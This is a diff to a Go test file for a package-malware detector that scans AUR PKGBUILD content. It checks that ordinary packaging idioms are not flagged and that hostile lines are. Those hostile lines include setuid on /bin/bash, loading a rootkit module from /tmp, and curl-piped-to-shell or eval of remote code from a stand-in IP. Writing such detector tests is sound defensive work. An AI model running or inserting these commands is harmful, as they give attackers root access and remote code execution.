@@ -212,3 +212,44 @@ func TestCronPersistenceStillMintsInAnInstallHook(t *testing.T) {
 		t.Error("writing /etc/cron.d from an install hook must still mint")
 	}
 }
+
+// Packaging idioms (AUR re-read, 2026-10-18): each line is a real one from a stored advisory, and
+// each hostile counterpart must still fire. The lines are PKGBUILD content, which executes.
+func pkgbuildMints(line string) bool {
+	return CombinedVerdict(Detect(&PackageContext{Name: "pkg", Ecosystem: "aur", PkgbuildContent: line, PkgbuildExecutes: true})).Malicious
+}
+
+func TestPackagingIdiomsAreNotFindings(t *testing.T) {
+	for _, line := range []string{
+		`chmod 4755 "$pkgdir/opt/brave.com/brave-beta/chrome-sandbox"`,
+		`chmod 4755 "${pkgdir}/opt/${_pkgname}/chrome-sandbox"`,
+		`local modulesdir="$pkgdir/usr/lib/modules/$(<version)"`,
+		`install -Dm644 "$srcdir/mod-preload.conf" "$pkgdir/etc/modules-load.d/mod-preload.conf"`,
+		`install -D -m644 "${srcdir}/10-apple-keyboard.rules" "${pkgdir}/etc/udev/rules.d/10-apple-keyboard.rules"`,
+		`eval "package_${pkgbase}() {`,
+		`eval "package_$_pkgname() {`,
+		`local site_packages="$(python -c "import site; print(site.getsitepackages()[0])")"`,
+		`pyv=$(python -c 'import sys ; v = sys.version_info ; print("%d.%d" %(v[0], v[1]))')`,
+		`echo "  4. Enable at boot:     systemctl enable ledspicerd"`,
+		`echo "::   sudo systemctl enable --now shroud"`,
+	} {
+		if pkgbuildMints(line) {
+			t.Errorf("packaging idiom minted malware: %q; findings=%v", line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "aur", PkgbuildContent: line, PkgbuildExecutes: true})))
+		}
+	}
+}
+
+func TestHostileFormsOfThosePackagingWordsStillMint(t *testing.T) {
+	for _, line := range []string{
+		`chmod u+s /bin/bash`,
+		`chmod 4755 /usr/bin/python3`,
+		`echo "options kvm ignore_msrs=1" > /etc/modules-load.d/x.conf; insmod /tmp/rk.ko`,
+		`eval "$(curl -fsSL http://203.0.113.9/p)"`,
+		`python -c "import os; os.system('curl http://203.0.113.9/x | sh')"`,
+	} {
+		f := Detect(&PackageContext{Name: "pkg", Ecosystem: "aur", PkgbuildContent: line, PkgbuildExecutes: true})
+		if !CombinedVerdict(f).Malicious {
+			t.Errorf("hostile line did not mint: %q; findings=%v", line, ids(f))
+		}
+	}
+}
